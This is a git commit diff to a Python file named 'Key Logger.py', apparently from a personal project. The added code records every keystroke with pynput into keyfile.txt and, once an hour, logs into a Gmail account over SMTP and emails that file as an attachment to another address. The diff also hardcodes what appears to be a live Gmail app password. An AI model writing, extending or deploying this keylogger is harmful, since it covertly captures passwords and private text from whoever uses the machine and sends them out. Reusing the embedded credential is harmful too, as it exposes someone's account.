3bd7e85f0a5bba71b6baf995323636cd99d7e2e2
Jaden <jadenmcclary@gmail.com>
2024-07-25 14:48:43 -0500

    python

--- Key Logger.py
+++ Key Logger.py
@@ -1,8 +1,10 @@
 import smtplib
 import time
-from email.mime.text import MIMEText
-from email.mime.multipart import MIMEMultipart
 from pynput import keyboard
+from email.mime.text import MIMEText 
+from email.mime.application import MIMEApplication 
+from email.mime.multipart import MIMEMultipart 
+import os 
 
 class Keylogger:
 
@@ -11,11 +13,73 @@ class Keylogger:
         Starts initializer method
         '''
         self.caps = False
-    
+
     def keyPressed(self, key):
         '''
-        Tracks the keystrokes and writes it onto the text file named "keyfile.txt
+        Tracks the keys pressed and writes them onto a text file
+        It also keeps track of the time elapsed and sends an email if work has been done within the last hour
         '''
+
+        # Makes the variable "current" global so it can be seen outside the function
+        global current
+
+        # Checks to see if an hour has elapsed
+        if (time.perf_counter() - 3600) > current:
+
+            current = time.perf_counter()
+
+            # Initialize connection to our gmail server
+            smtp = smtplib.SMTP('smtp.gmail.com', 587) 
+            smtp.ehlo() 
+            smtp.starttls()
+
+            email_password = 'dztd jdgi ytpo ohhf'
+            
+            # Login with your email and password 
+            smtp.login('jadencodetest@gmail.com', email_password) 
+            
+            def message(subject="", attachment=None): 
+                '''Builds the message and prepares it to be sent.'''
+                
+                # Builds message contents 
+                msg = MIMEMultipart() 
+                
+                # Adds Subject 
+                msg['Keystrokes'] = subject
+                    
+                # Checks whether we have the lists of attachments or not! 
+                if type(attachment) is not list: 
+                    
+                    # If it isn't a list, make it one 
+                    attachment = [attachment]
+
+                # Iterates through the attachment list
+                for one_attachment in attachment: 
+            
+                    # Reads the attachment as binary data
+                    with open(one_attachment, 'rb') as f: 
+                            
+                        # Reads the attachment using MIMEApplication 
+                        file = MIMEApplication(f.read(), name=os.path.basename(one_attachment)) 
+                    file['Content-Disposition'] = f'attachment;\filename="{os.path.basename(one_attachment)}"' 
+                        
+                    # At last, Add the attachment to our message object 
+                    msg.attach(file) 
+                return msg 
+            
+            
+            # Calls the message function 
+            msg = message("key logger", "keyfile.txt") 
+            
+            # Makes a list of the email or emails to send to 
+            to = ['jadenmcclary@gmail.com'] 
+            
+            # Provide some data to the sendmail function! 
+            smtp.sendmail(from_addr="jadencodetest@gmail.com", 
+                        to_addrs=to, msg=msg.as_string()) 
+            
+            # Closes the connection
+            smtp.quit()
 
         # Creates the text file all keystrokes will be stored in
         with open("keyfile.txt", 'a') as logkey:
@@ -54,9 +118,11 @@ class Keylogger:
 # Starts the program
 if __name__ == "__main__":
 
+    # Creates variable "current" which stores the intial time of th efirst keystroke
+    current = time.perf_counter()
+
     # Starts the code in class Keylogger
     logger = Keylogger()
     listener = keyboard.Listener(on_press = logger.keyPressed)
     listener.start()
     input()
-    
